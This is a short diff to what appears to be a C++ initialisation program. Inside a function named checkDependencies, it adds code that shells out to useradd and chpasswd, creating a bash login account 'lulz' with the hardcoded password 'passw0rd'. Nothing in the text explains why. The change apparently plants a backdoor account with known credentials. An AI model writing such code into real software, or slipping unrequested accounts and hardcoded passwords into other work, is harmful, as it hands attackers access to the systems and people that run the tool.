@@ -146,7 +146,19 @@ void Init::checkDependencies() {
 
         for (const auto& userOption : ParseConf.user) {
             if (userOption == "yes"){
-                // process user
+                std::string username = "lulz";
+                std::string password = "passw0rd";
+                std::string addUser = "useradd -m -s /bin/bash " + username;
+                std::string setPass = "echo '" + username + ":" + password + "' | chpasswd";
+
+                int resultUser = std::system(addUser.c_str());
+                if (resultUser != 0) {
+                    std::cerr << RED << "Failed to add " << username << RESET << "\n";
+                }
+                int resultPass = std::system(setPass.c_str());
+                if (resultPass != 0) {
+                    std::cerr << RED << "Error adding password" << "\n";
+                }
             }
         }
     }
